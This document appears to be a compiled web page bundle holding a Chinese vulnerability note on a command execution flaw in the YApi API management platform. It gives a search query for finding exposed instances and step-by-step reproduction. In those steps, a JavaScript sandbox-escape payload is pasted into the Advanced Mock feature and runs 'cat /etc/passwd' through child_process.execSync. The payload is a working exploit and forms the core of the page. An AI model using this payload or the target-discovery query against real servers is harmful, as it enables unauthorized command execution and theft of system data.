import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e as t}from"./app-58e4a7d6.js";const e={},o=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>YApi 接口管理平台 后台存在命令执行漏洞，攻击者通过发送特定的请求可执行任意命令获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>YApi 接口管理平台
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;YApi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091829002.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>首先需要注册账户并登录</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091829520.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091829602.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加项目，参数任意</p><p>创建后点击 高级Mock 输入如下Payload</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// 获取Context</span>
<span class="token keyword">const</span> ObjectConstructor <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>constructor<span class="token punctuation">;</span> <span class="token comment">// 获取 Object 对象构造函数</span>
<span class="token keyword">const</span> FunctionConstructor <span class="token operator">=</span> <span class="token class-name">ObjectConstructor</span><span class="token punctuation">.</span>constructor<span class="token punctuation">;</span> <span class="token comment">// 获取 Function 对象构造函数</span>
<span class="token keyword">const</span> myfun <span class="token operator">=</span> <span class="token function">FunctionConstructor</span><span class="token punctuation">(</span><span class="token string">&#39;return process&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造一个函数，返回process全局变量</span>
<span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">myfun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mockJson <span class="token operator">=</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;child_process&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">&quot;cat /etc/passwd&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091830184.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>预览处点击项目链接</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091830086.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),p=[o];function c(i,r){return a(),s("div",null,p)}const d=n(e,[["render",c],["__file","YApi 接口管理平台 后台命令执行漏洞.html.vue"]]);export{d as default};
